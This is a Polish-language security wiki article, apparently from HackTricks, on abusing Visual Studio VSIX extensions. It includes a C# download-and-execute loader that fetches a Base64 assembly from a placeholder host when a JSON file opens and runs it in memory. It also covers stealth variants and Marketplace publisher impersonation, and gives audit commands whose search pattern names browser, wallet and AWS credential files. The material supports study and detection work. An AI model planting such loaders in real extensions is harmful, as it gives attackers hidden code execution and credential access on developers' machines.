# Nadużywanie rozszerzeń VSIX w Visual Studio

{{#include ../banners/hacktricks-training.md}}

Rozszerzenie Visual Studio może wykorzystać zwykłą aktywność w edytorze do wykonania kodu z uprawnieniami zalogowanego użytkownika. Złośliwy VSIX, wydawca podszywający się pod prawdziwego lub przejęta aktualizacja rozszerzenia mogą dotrzeć do użytkownika za pośrednictwem standardowych kanałów instalacji. Instalacja wymagająca potwierdzenia przez administratora to instalacja za zgodą użytkownika, a nie automatyczne podniesienie uprawnień.<sup>[[1]](#references)</sup>

## Model wykonywania

Rozszerzenia oparte na klasycznym VSSDK często działają wewnątrz `devenv.exe`. Nowszy model `VisualStudio.Extensibility` uruchamia współczesne rozszerzenia .NET głównie poza procesem: Visual Studio pośredniczy w wywołaniach do dedykowanego procesu `Microsoft.ServiceHub.Host.Extensibility`, co odizolowuje stabilność IDE, ale **nie** ogranicza rozszerzeniu dostępu do uprawnień użytkownika Windows. Dokładna nazwa pliku wykonywalnego może zawierać przyrostek architektury, np. `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Aktywacja podczas zwykłej pracy w edytorze

Zamiast udostępniać wyłącznie rzucające się w oczy polecenie menu, rozszerzenie może implementować `ITextViewOpenClosedListener`. Wywołanie zwrotne `TextViewOpenedAsync` jest uruchamiane dla pasujących dokumentów, a `TextViewExtensionConfiguration.AppliesTo` może ograniczyć aktywację do powszechnego typu, takiego jak JSON. Prawdziwy formatter lub linter może nadal wykonywać reklamowane zadania, podczas gdy druga akcja uruchamia się jako efekt uboczny otwarcia pliku.<sup>[[1]](#references)[[3]](#references)</sup>

Poniższy uproszczony przykład pokazuje najważniejsze punkty wykonywania; dla przejrzystości pominięto w nim działanie legalnego formattera i obsługę błędów.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Wyzwalany zdarzeniem loader zarządzanych assembly w pamięci</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Ten łańcuch pobiera tekst Base64, dekoduje go do bajtów assembly, ładuje z `MemoryStream` za pośrednictwem kolekcjonowalnego `AssemblyLoadContext`, wywołuje refleksyjnie `EntryPoint` bez parametrów lub z `string[]`, oczekuje na zakończenie asynchronicznych punktów wejścia, a następnie zwalnia kontekst. Drugi etap nie jest zapisywany na dysku, choć VSIX i główna biblioteka DLL rozszerzenia pozostają artefaktami na dysku. Base64 nie zapewnia autentyczności ani poufności; użycie HTTP umożliwia też napastnikowi znajdującemu się na ścieżce podmianę odpowiedzi.<sup>[[1]](#references)</sup>

Warianty operacyjne obejmują tłumienie wszystkich wyjątków, aby reklamowana funkcja działała nadal w razie niepowodzenia pobierania lub użycie `ITextViewChangedListener`, aby uruchomić kod po wprowadzeniu zmian. Kod działa w hoście rozszerzenia i może korzystać z dostępnych dla danego użytkownika zarządzanych API, P/Invoke, plików, poświadczeń i procesów potomnych.<sup>[[1]](#references)</sup>

Powiązaną, specyficzną dla edytora powierzchnię wykonywania kodu, opartą na automatycznym ładowaniu natywnych wtyczek, opisano tutaj:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Nadużywanie zaufania do Marketplace i kanałów dystrybucji

VSIX może trafić do użytkownika jako bezpośrednio udostępniony lub wyłudzony plik, z Marketplace w sieci albo przez wbudowaną w Visual Studio przeglądarkę Marketplace. Rejestracja wydawcy, która zasadniczo sprawdza unikalność i listę zastrzeżonych słów, może umożliwiać tworzenie wizualnie sugestywnych tożsamości wydawców; przejęcie zaufanego już wydawcy lub rozszerzenia jest jeszcze skuteczniejsze, ponieważ zapewnia dostęp do jego bazy zainstalowanych użytkowników. Instalacja z Marketplace uruchamia Visual Studio Installer i tymczasowo umieszcza pobrany plik VSIX w `%LOCALAPPDATA%\Temp`; `payload.vsix` jest również używany zgodnie z przeznaczeniem, więc sama nazwa pliku nie jest wskaźnikiem.<sup>[[1]](#references)</sup>

MDSec nie zidentyfikował protokołu URL Visual Studio, który bezpośrednio instalowałby rozszerzenie. Operator nadal musi nakłonić użytkownika do zainstalowania lub zaufania plikowi VSIX albo przejąć istniejący kanał dystrybucji rozszerzenia. Pakiet `AllUsers` instaluje się w folderze instalacyjnym Visual Studio i może wymagać podniesienia uprawnień, ale jest to standardowe działanie instalatora wymagające zgody, a nie automatyczna droga do uzyskania uprawnień administratora lub SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Statyczny audyt na dużą skalę

Pakiety VSIX są zazwyczaj kontenerami ZIP, dlatego bezpieczny proces przeglądu Marketplace może wyliczać pakiety, rozpakowywać je **bez ładowania kodu rozszerzeń**, analizować manifesty, identyfikować powierzchnie wykonywania kodu i dekompilować zarządzane zestawy za pomocą `ilspycmd`. W pierwszej kolejności należy analizować zestawy należące do rozszerzenia, pomijając typowe dołączone zależności, a następnie korelować ciągi znaków związane z magazynami poświadczeń z grupami zachowań, takimi jak odczyt pliku i wysyłanie przez sieć, kodowanie i wysyłanie, pobieranie i wykonywanie, dostęp do menedżera poświadczeń i dostęp przez sieć lub zrzut ekranu i wysyłanie.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Inwentaryzuj również natywne biblioteki DLL, cele MSBuild, skrypty, szablony T4 i ładunki instalatorów, zamiast zakładać, że każdy obszar wykonania obejmuje kod zarządzany. Porównuj podejrzane zachowanie z deklarowanym przeznaczeniem w manifeście; telemetria i legalne aktualizatory mogą przypominać eksfiltrację lub staging. Analiza wyłącznie statyczna nie wykrywa kodu spakowanego, zaciemnionego, rozwiązywanego dynamicznie ani uśpionego, a analiza tylko najnowszej wersji pomija złośliwe wydania historyczne.<sup>[[1]](#references)</sup>

Osobny atak podczas ładowania projektu może wykonać złośliwy cel [MSBuild `GetFrameworkPaths`](visual-studio-project-msbuild-execution.md) bez instalowania VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Ponowne spojrzenie na rozszerzenia Visual Studio](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Informacje o VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Budowa pakietu VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - narzędzie .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Kampania Blinder Tunnel wymierzona w iracką infrastrukturę](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
